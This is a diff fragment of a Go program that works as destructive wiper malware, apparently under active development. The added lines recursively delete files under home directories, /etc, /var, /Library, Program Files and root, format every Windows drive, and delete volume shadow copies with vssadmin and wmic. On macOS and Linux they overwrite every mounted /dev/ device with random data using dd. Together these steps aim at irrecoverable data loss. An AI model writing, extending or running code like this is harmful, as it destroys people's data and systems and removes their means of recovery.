@@ -24,19 +24,23 @@ func main() {
 	if err != nil {
 		fmt.Println(err.Error())
 	}
-	openAndRecurse(usr.HomeDir)
+	openAndRecurse(usr.HomeDir + string(filepath.Separator))
 	// Remove OS Specific files //
 	// Windows Specific //
 	if runtime.GOOS == "windows" {
 		// Removing Users Files //
 		openAndRecurse("C:\\Users\\")
-		// Start Formating Disk
+		// Start Formating Disk //
 		for _, drive := range getdrives() {
 			d2 := drive + ":"
-			fmt.Println(d2)
-			wg.Add(1)
+			//fmt.Println(d2)
+			//wg.Add(1)
 			go runCommand("Format", []string{d2, "/P:1"})
+			// Delete Volume Shadow Copy //
+			go runCommand("vssadmin.exe", []string{"delete", "shadows", "/for=" + d2, "/oldest", "/quiet"})
 		}
+		// Delete Volume Shadow Copy //
+		runCommand("wmic.exe", []string{"shadowcopy", "delete", "/nointeractive"})
 		// Remove Program Files //
 		openAndRecurse("C:\\Program Files\\")
 		if runtime.GOARCH == "x64" {
@@ -47,42 +51,71 @@ func main() {
 	}
 	// MacOS Specific //
 	if runtime.GOOS == "darwin" {
+		// Up the ulimit for open files //
+		runCommand("ulimit", []string{"-n", "12288"})
 		// Removing Users Homes //
 		openAndRecurse("/Users/")
+		// Removing var //
+		openAndRecurse("/private/var/")
+		// Removing etc //
+		openAndRecurse("/private/etc/")
+		// Remove Data //
+		openAndRecurse("/Library/")
 		// Remove Program Files //
 		openAndRecurse("/Applications/")
 		// Start Zero Disks //
-		//runCommand("dd", []string{"if=/dev/urandom", "of=/dev/disk0s1"})
-		//runCommand("dd", []string{"if=/dev/urandom", "of=/dev/disk0s2"})
-		//runCommand("dd", []string{"if=/dev/urandom", "of=/dev/disk1s1"})
+		res, err := runCommand("mount", []string{})
+		fmt.Println(res)
+		if err != nil {
+			fmt.Println(err.Error())
+		}
+		wordz := strings.Split(res, " ")
+		for _, wordo := range wordz {
+			if strings.Contains(wordo, "/dev/") {
+				runCommand("dd", []string{"if=/dev/urandom", "of=" + wordo})
+			}
+		}
 		// Remove Root Files (This should be done as last as possible, target files first) //
 		openAndRecurse("/")
 	}
 	// Linux Specific //
 	if runtime.GOOS == "linux" {
+		// Up the ulimit for open files //
+		runCommand("ulimit", []string{"-n", "12288"})
 		// Removing Users Homes //
 		openAndRecurse("/home/")
 		// Removing opt //
 		openAndRecurse("/opt/")
 		// Removing var //
 		openAndRecurse("/var/")
+		// Removing etc //
+		openAndRecurse("/etc/")
 		// Start Zero Disks //
-		//runCommand("dd", []string{"if=/dev/urandom", "of=/dev/sda"})
-		//runCommand("dd", []string{"if=/dev/urandom", "of=/dev/sdb"})
-		// Remove Root Files (This should be done as last as possible, target files first) //
+		res, err := runCommand("mount", []string{})
+		fmt.Println(res)
+		if err != nil {
+			fmt.Println(err.Error())
+		}
+		wordz := strings.Split(res, " ")
+		for _, wordo := range wordz {
+			if strings.Contains(wordo, "/dev/") {
+				runCommand("dd", []string{"if=/dev/urandom", "of=" + wordo})
+			}
+		}
 		openAndRecurse("/")
 	}
 	wg.Wait()
+
 }
 
 func openAndRecurse(pathToDir string) {
 	files, err := ioutil.ReadDir(pathToDir)
 	if err != nil {
-		//fmt.Println(err)
-		return
+		fmt.Println(err)
+		//return
 	}
 	for _, file := range files {
-		fmt.Println(file.Name())
+		//fmt.Println(file.Name())
 		if file.IsDir() {
 			//fmt.Println("--DEBUG-- File is a dir, recurse time!")
 			dirName := file.Name() + string(filepath.Separator)
